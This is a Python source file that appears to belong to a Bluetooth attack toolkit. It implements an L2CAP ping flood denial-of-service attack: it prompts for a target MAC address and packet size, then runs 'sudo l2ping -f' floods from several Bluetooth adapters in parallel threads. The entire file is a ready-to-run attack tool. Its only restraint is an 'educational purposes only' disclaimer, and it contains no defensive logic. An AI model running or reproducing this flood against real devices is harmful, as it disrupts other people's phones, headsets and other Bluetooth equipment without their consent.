"""
L2CAP Denial of Service Attack

This module performs Bluetooth L2CAP ping flood attacks against target devices.
It sends rapid L2CAP echo request packets to a target MAC address using multiple
Bluetooth adapters to overwhelm and potentially disrupt the target device.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

import subprocess
import time
import sys
from ui import cprint, iprint, wprint, eprint, sprint, cinput, CYAN, YELLOW, RED, WHITE, RESET


class L2CAPDOSAttack:
    """
    Performs Bluetooth L2CAP denial of service attacks on target devices.
    
    Uses l2ping command to send rapid L2CAP echo request packets to a target
    device, potentially causing denial of service or disruption.
    """
    
    def __init__(self, adapters):
        """
        Initialize the L2CAP DOS attack.
        
        Args:
            adapters (list): List of HCI device identifiers (e.g., ["hci0", "hci1"]).
        """
        self.adapters = adapters
        self.target_address = None
        self.packet_size = 600
        self.is_running = False
    
    def validate_target_address(self, address):
        """
        Validate Bluetooth MAC address format.
        
        Args:
            address (str): MAC address in format XX:XX:XX:XX:XX:XX
        
        Returns:
            bool: True if valid format, False otherwise.
        """
        parts = address.split(':')
        if len(parts) != 6:
            return False
        
        for part in parts:
            try:
                int(part, 16)
                if len(part) != 2:
                    return False
            except ValueError:
                return False
        
        return True
    
    def execute_l2cap_ping(self, adapter, target_mac):
        """
        Execute L2CAP ping command against target device.
        
        Args:
            adapter (str): HCI device identifier (e.g., "hci0").
            target_mac (str): Target Bluetooth MAC address.
        """
        try:
            command = f"sudo l2ping -i {adapter} -s {self.packet_size} -f {target_mac}"
            subprocess.run(command, shell=True, timeout=None)
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            eprint(f"Error executing l2ping on {adapter}: {e}")
    
    def run_attack(self):
        """
        Execute L2CAP ping flood attack on target device.
        
        Spawns parallel processes for each adapter to flood the target
        with L2CAP echo request packets.
        """
        import threading
        
        self.is_running = True
        threads = []
        
        iprint(f"Starting L2CAP DOS attack on {self.target_address}")
        iprint(f"Using {len(self.adapters)} adapter(s): {', '.join(self.adapters)}")
        iprint(f"Packet size: {self.packet_size} bytes")
        iprint(f"Press Ctrl+C to stop\n")
        
        # Launch L2CAP ping on each adapter
        for adapter in self.adapters:
            thread = threading.Thread(
                target=self.execute_l2cap_ping,
                args=(adapter, self.target_address),
                daemon=True
            )
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger thread starts
        
        try:
            # Keep threads alive
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            pass
    
    def run_interactive(self):
        """
        Run the attack with interactive user input.
        
        Prompts user for target MAC address and packet size configuration.
        """
        print()
        cprint("=" * 60, CYAN)
        cprint("L2CAP Denial of Service Attack", CYAN)
        cprint("=" * 60, CYAN)
        print()
        
        cprint(f"Active adapters: {', '.join(self.adapters)}", WHITE)
        print()
        
        # Get target address
        while True:
            target = cinput("Target Bluetooth MAC address (XX:XX:XX:XX:XX:XX)", CYAN)
            
            if not target:
                wprint("Invalid input, please try again")
                continue
            
            if not self.validate_target_address(target):
                eprint("Invalid MAC address format. Use XX:XX:XX:XX:XX:XX")
                continue
            
            self.target_address = target
            break
        
        # Get packet size
        try:
            size_input = cinput("Packet size in bytes (default 600)", CYAN) or "600"
            self.packet_size = int(size_input)
            
            if self.packet_size < 1 or self.packet_size > 65535:
                wprint("Packet size out of range, using default 600")
                self.packet_size = 600
        
        except ValueError:
            wprint("Invalid packet size, using default 600")
            self.packet_size = 600
        
        print()
        cprint("Configuration:", CYAN)
        cprint(f"  Target: {self.target_address}", WHITE)
        cprint(f"  Adapters: {len(self.adapters)}", WHITE)
        cprint(f"  Packet Size: {self.packet_size} bytes", WHITE)
        print()
        
        # Execute attack
        try:
            self.run_attack()
            sprint("Attack completed!")
        except KeyboardInterrupt:
            wprint("\nAttack stopped by user")
        except Exception as e:
            eprint(f"Attack error: {e}")
